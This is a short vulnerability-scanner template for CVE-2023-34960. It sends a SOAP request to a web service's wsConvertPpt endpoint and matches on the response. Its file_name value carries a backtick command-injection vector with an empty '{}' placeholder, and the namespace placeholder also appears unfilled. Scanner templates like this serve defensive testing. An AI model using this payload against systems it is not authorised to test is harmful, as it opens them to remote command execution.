CVES/high/CVE-2023-34960.yaml

id: CVE-2023-34960
info:
  name: CVE-2023-34960
  author: SirBugs
  severity: high
  description: |
    This template checks for the CVE-2023-34960 vulnerability in the /main/webservices/additional_webservices.php endpoint.

requests:
  - method: POST
    path:
      - "{{BaseURL}}/main/webservices/additional_webservices.php"
    headers:
      Content-Type: "text/xml"
    body: |
      <?xml version="1.0" encoding="UTF-8"?>
      <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="{}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:wsConvertPpt><param0 xsi:type="ns2:Map"><item><key xsi:type="xsd:string">file_data</key><value xsi:type="xsd:string"></value></item><item><key xsi:type="xsd:string">file_name</key><value xsi:type="xsd:string">{}`.pptx</value></item><item><key xsi:type="xsd:string">service_ppt2lp_size</key><value xsi:type="xsd:string">720x540</value></item></param0></ns1:wsConvertPpt></SOAP-ENV:Body></SOAP-ENV:Envelope>
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "wsConvertPptResponse"
        part: body
